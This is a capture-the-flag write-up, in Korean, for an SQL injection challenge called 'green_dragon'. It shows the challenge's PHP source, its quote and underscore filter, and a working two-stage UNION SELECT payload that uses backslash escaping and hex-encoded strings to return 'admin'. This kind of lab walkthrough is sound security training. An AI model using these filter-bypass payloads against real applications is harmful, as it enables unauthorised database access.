# green_dragon

## 1. Code
```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\'|\"/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\.|\'|\"/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id,pw from prob_green_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']){
    if(preg_match('/prob|_|\.|\'|\"/i', $result['id'])) exit("No Hack ~_~");
    if(preg_match('/prob|_|\.|\'|\"/i', $result['pw'])) exit("No Hack ~_~");
    $query2 = "select id from prob_green_dragon where id='{$result[id]}' and pw='{$result[pw]}'";
    echo "<hr>query2 : <strong>{$query2}</strong><hr><br>";
    $result = mysqli_fetch_array(mysqli_query($db,$query2));
    if($result['id'] == "admin") solve("green_dragon");
  }
  highlight_file(__FILE__);
?>
```

## 2. Condition
- 1차적으로 get 파라미터 `id`와 `pw`의 값을 받고 쿼리를 보낸다.('query :')   
- 2차적으로 위에서 나온 결과의 `id`와 `pw`를 다시 쿼리로 보낸다.('query2 :')   
- 두 과정에서 모두 `prob _ . ' "`를 필터링한다.   
- 최종적으로 마지막 쿼리의 결과가 `admin`이라면 문제가 해결된다.   

## 3. Solution
위 에서 말했듯이, 두 부분으로 나누어 생각해야 한다.   
최종단계 부터 거꾸로 거슬러 올라가면 쉽게 해결된다.   

------
### 1. 쿼리의 결과 `id`값이 `admin`이어야 한다   
>    `' "`가 필터링 되므로, `\`문자를 통해 이스케이핑 시키는 방법을 이용한다.   
    그리고 문자 'admin'은 hex값을 통해 우회하였다.

변수명 | 값
---|---
`id` | \
`pw` | union select `0x61646d696e`


다음 단계로 넘어가보자.    


------
### 2. 쿼리의 결과 `id`값이 `\`, `pw`값이 `union select 0x61646d696e`이어야 한다.   
>    마찬가지로, `\`를 이용한 이스케이핑을 한다.   
    1번 과정에서 필요한 값과 구문들을 모두 hex값으로 변환하여 보내었다.   
>
>    `\` > 0x5c
    `  union select 0x61646d696e#` > 0x20756e696f6e2073656c6563742030783631363436643639366523    

변수명 | 값
---|---
`id` | \
`pw` | %20union%20select%20`0x5c`,`0x20756e696f6e2073656c6563742030783631363436643639366523`%23


성공적으로 문제가 해결된다.